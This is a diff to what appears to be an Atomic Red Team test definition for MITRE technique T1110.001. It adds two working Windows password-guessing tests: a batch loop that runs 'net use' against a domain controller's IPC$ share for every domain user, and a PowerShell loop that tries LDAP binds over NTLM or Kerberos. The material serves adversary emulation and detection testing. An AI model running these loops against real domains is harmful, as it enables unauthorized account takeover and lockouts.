@@ -1,10 +1,41 @@
 attack_technique: T1110.001
 display_name: 'Brute Force: Password Guessing'
 atomic_tests:
-- name: Brute Force Credentials
+- name: Brute Force Credentials of all domain users via SMB
   auto_generated_guid: 09480053-2f98-4854-be6e-71ae5f672224
   description: |
-    Attempt to brute force user on remote host
+    Creates username and password files then attempts to brute force on remote host
+  supported_platforms:
+  - windows
+  input_arguments:
+    input_file_users:
+      description: Path to a file containing a list of users that we will attempt to brute force
+      type: Path
+      default: DomainUsers.txt
+    input_file_passwords:
+      description: Path to a file containing a list of passwords we will attempt to brute force with
+      type: Path
+      default: passwords.txt
+    remote_host:
+      description: Hostname of the target system we will brute force upon
+      type: String
+      default: '\\COMPANYDC1\IPC$'
+    domain:
+      description: Domain name of the target system we will brute force upon
+      type: String
+      default: YOUR_COMPANY
+  executor:
+    name: command_prompt
+    command: |
+      net user /domain > #{input_file_users}
+      echo "Password1" >> #{input_file_passwords}
+      echo "1q2w3e4r" >> #{input_file_passwords}
+      echo "Password!" >> #{input_file_passwords}
+      @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
+- name: Brute Force Credentials of single domain user via LDAP against domain controller (NTLM or Kerberos)
+  auto_generated_guid: c2969434-672b-4ec8-8df0-bbb91f40e250
+  description: |
+    Attempt to brute force domain user on a domain controller, via LDAP, with NTLM or Kerberos
   supported_platforms:
   - windows
   input_arguments:
@@ -13,36 +44,50 @@ atomic_tests:
       type: String
       default: bruce.wayne
     passwords:
-      description: list of passwords we will attempt to brute force with
+      description: List of passwords we will attempt to brute force with
       type: String
-      default: 
+      default: Password1`n1q2w3e4r`nPassword!
+    dc:
+      description: Name of the domain controller we will target (without domain FQDN suffix)
+      type: String
+      default: dc
     domain:
-      description: Domain name of the target system we will brute force upon
+      description: Domain FQDN
       type: String
       default: contoso.com
     output_file:
-      description: Path to bruteforce output 
+      description: Path to bruteforce output
       type: Path
       default: C:\Windows\Temp\tmp.txt
-    number_of_attempts:
-      description: Number of password spraying attempts 
-      type: String
-      default: 2
+    auth:
+      description: authentication method to choose between "NTLM" and "Kerberos"
+      type: string
+      default: NTLM
   executor:
     name: powershell
+    elevation_required: false
     command: |
+      if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {
+        Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
+        exit 1
+      }
+
+      [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
+      $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{dc}.#{domain}",389)
+
       $passwords = "#{passwords}".split("{`n}")
-      $found = @()
-      for ($i = 0; $i -lt #{number_of_attempts}; $i++) {
-        "[-] Round ${i} of password guessing" | Out-File -FilePath #{output_file} -Append
-        foreach ($password in $passwords){
+      foreach ($password in $passwords){
+        $credz = new-object System.Net.NetworkCredential("#{user}", $password, "#{domain}")
+        $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
+        try {
           " [-] Attempting ${password} on account #{user}." | Out-File -FilePath #{output_file} -Append
-          if ((new-object directoryservices.directoryentry "","#{user}",$password).psbase.name -ne $null) {
-            if (-not ($found.Contains("#{user}:${password}")){
-                " [!] #{user}:${password} are valid credentials on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
-                $found += ,"#{user}:${password}"
-            }
-          }
+          $conn.bind()
+          # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+          " [!] #{user}:${password} are valid credentials!" | Out-File -FilePath #{output_file} -Append
+        } catch {
+          $_.Exception.Message | Out-File -FilePath #{output_file} -Append
         }
       }
       "End of bruteforce" | Out-File -FilePath #{output_file} -Append
+    cleanup_command: |
+      del #{output_file}
